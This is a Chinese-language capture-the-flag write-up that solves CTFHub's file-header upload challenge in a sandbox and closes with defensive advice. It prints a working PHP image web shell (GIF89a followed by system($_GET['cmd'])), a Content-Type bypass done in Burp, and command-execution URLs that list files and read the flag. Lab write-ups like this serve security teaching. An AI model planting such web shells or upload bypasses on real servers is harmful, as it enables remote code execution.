CTFHub 文件上传 - 文件头检测

2026年9月22日 CTFHub Web安全 文件上传 图片马

一、题目信息

  • 题目名称：文件上传 - 文件头检测
  • 题目平台：CTFHub 技能树
  • 题目类型：Web安全 / 文件上传漏洞 / Magic Bytes 校验绕过
  • 靶场链接：http://challenge-eeee57f304ff8f52.sandbox.ctfhub.com:10800（动态环境）
  • 涉及工具：Chrome浏览器、Burp Suite 抓包工具、Base64在线解码工具

二、解题步骤

1. 分析题目考什么

本题的核心考点是绕过文件头（Magic Bytes）检测。服务器后端使用 getimagesize() 或类似函数读取了文件开头的几个字节（文件头），用来判断上传的是否为真实的图片。单纯修改后缀或 MIME 已经无法绕过，必须构造“图片马”，即给我们的 PHP 木马穿上合法的图片头外衣。

2. 怎么想（破题思路）

  • 尝试直接上传纯 PHP 木马被拦截，确认存在文件内容检测。
  • 既然检查文件头，那就在 PHP 代码最前面加上合法的图片头，例如 GIF 的 GIF89a。
  • 构造内容为 GIF89a 的文件，同时将后缀名保存为 .php。
  • 注意：回显的内容由于带有 GIF89a 前缀，直接使用 Base64 解码容易出错，可改用直接执行 cat 命令读取明文。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：Base64 解码失败（夹杂了图片头）

踩坑情况：读取 Flag 文件时，回显数据为 GIF89aPD9waHAgLy8gY3RmaHVi...。将其直接放入 Base64 解码器，得到一长串乱码。

原因分析：回显数据包含了我们在第一步添加的图片头 GIF89a。Base64 解码器会把这些字符也当作 Base64 数据强行解码，导致结果错误。

改进方式：解码时，只需复制从 PD9waHAg 开始的部分即可，前面的 GIF89a 是纯文本头，不属于 Base64 编码内容。或者直接放弃 Base64，使用 cat 命令读取明文。

踩坑记录二：提交解码后的 Flag 提示“flag错误”（环境陷阱）

踩坑情况：成功解码得到 ctfhub{3f3effab6af24f4775342262}，提交却提示错误。

原因分析：**这是 CTFHub 沙盒的机制坑！** 靶场环境是按时间计费的，临近过期时（如倒计时 10 分钟以内），系统会在后台动态重置 Flag 文件的内容。你读取到的是几分钟前的旧 Flag，而服务器现在的正确答案已经变了。

改进方式：拿到 Flag 后必须立刻提交。如果提交报错，不要怀疑自己的解法，立刻重新访问 ?cmd=base64 读取一遍最新内容，或者干脆**放弃该环境，立刻重开一局**，用最短的时间打完连招并提交。

详细实操步骤（推荐使用直接读取明文法）

第一步：制作图片马

本地新建 shell.php，写入以下代码（必须顶格写，不能有空格或换行）：

GIF89a<?php system($_GET['cmd']); ?>

代码逐字深度解析：

  • GIF89a：GIF 图片的合法文件头，欺骗服务器的 getimagesize 检测。
  • <?php：PHP 脚本起始标记。PHP 解析器会忽略前面的 GIF89a，从这里开始执行。
  • system：执行外部系统命令的内置函数。
  • $_GET['cmd']：接收 URL 参数 cmd 的值作为系统命令。
  • ; 和 ?>：PHP 语句结束和脚本结束标记。

第二步：绕过 MIME 并上传

在页面上传 shell.php。如果服务器拦截，开启 Burp Suite 抓包，修改 Content-Type: application/octet-stream 为 Content-Type: image/gif，放行。页面回显路径：upload/shell.php。

第三步：寻找 Flag 文件

访问：http://.../upload/shell.php?cmd=ls%20/var/www/html/

在回显中找到目标文件名：flag_2901918741.php。

第四步：修改木马直接读取明文（强推此方法）

放弃使用 Base64 传参（容易混入 GIF89a 导致乱码）。直接修改本地 shell.php 的内容为：

GIF89a
<?php
passthru("cat /var/www/html/flag_2901918741.php");
?>

重新上传覆盖。然后直接在浏览器访问 http://.../upload/shell.php（不带任何参数）。

查看网页源码（右键 -> 查看网页源代码），即可直接看到明文 Flag：ctfhub{abd020f9ad7a28b3f6d8f1426ac6254238ccf1cb}。

4. 怎么迁移（跨领域联想）

  • 二次渲染绕过：在实战中，如果服务器对图片进行了二次渲染（如 GD 库重新生成图片），我们的 GIF89a 头可能会在重新渲染中丢失。此时需要制作“二次渲染马”，将恶意代码插入图片的特定像素点或 EXIF 注释字段中。
  • 文件包含漏洞（LFI）组合利用：图片马通常不能直接执行，需要配合文件包含漏洞（如 ?file=upload/shell.php）来触发执行。
  • 安全开发（SDL）：正确防御方式是使用“白名单”检查后缀，并结合“二次渲染”强制销毁非图片数据，同时禁止上传目录具有执行权限。

三、名词大全与原理深度复盘

1. 文件头（Magic Bytes）

文件开头的特定十六进制标识（如 JPEG 是 FF D8 FF，PNG 是 89 50 4E 47，GIF 是 GIF89a）。操作系统和 Web 服务器通过读取这几个字节来判断文件的真实类型。

2. 图片马（Picture Webshell）

将恶意代码附加在正常图片文件头之后形成的特制文件。既能通过图片校验，又保留了 PHP 代码的执行能力。

3. PHP 解析机制与上下文无关性

PHP 解析器在执行文件时，只寻找 <?php 和 ?> 标签。标签之外的任何字符（包括 GIF89a）都会被当作 HTML 输出或直接忽略。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 MIME 绕过的区别：MIME 只检查请求头的 Content-Type（声明式）；文件头检测直接读取文件内容（实质式）。
  • 与双写后缀的区别：双写针对的是文件后缀名的字符串过滤缺陷；文件头检测针对的是文件内容的真实性校验。

2. 这种题目的出现原因

开发人员为了防止上传恶意脚本，引入了 getimagesize() 等函数。他们忽略了服务器底层解析逻辑与文件类型检查逻辑是不一致的，导致可以用图片马绕过。

3. 这种应用在实际中如何体现？

在真实的红蓝对抗中，头像上传、附件上传等业务常部署此类检测。攻击者一旦发现校验，会尝试构造图片马，并寻找 LFI 漏洞触发，或寻找服务器上的解析漏洞来执行代码。

4. 如何抽象理解概念（大白话理解）

把服务器安检比作检查包裹：

  • 黑名单（查标签）：保安检查包裹外标签，看到“刀具”没收。我们把标签改成“拐杖”就混进去了。
  • MIME（查清单）：保安看你的随箱清单上写着“衣物”，就放行了。
  • 文件头检测（摸材质）：保安不仅要看标签，还要伸手摸一摸里面的东西。这时我们把刀伪装成一根“拐杖”（GIF89a）递过去，保安摸到是根棍子，就放行了。但他不知道，这根“拐杖”里面藏着一把锋利的刀（PHP代码），厨房里的厨师（PHP解析器）拿到拐杖，轻轻一按机关，刀就弹出来了。

做一道题，就要往自己脑子里装点东西。
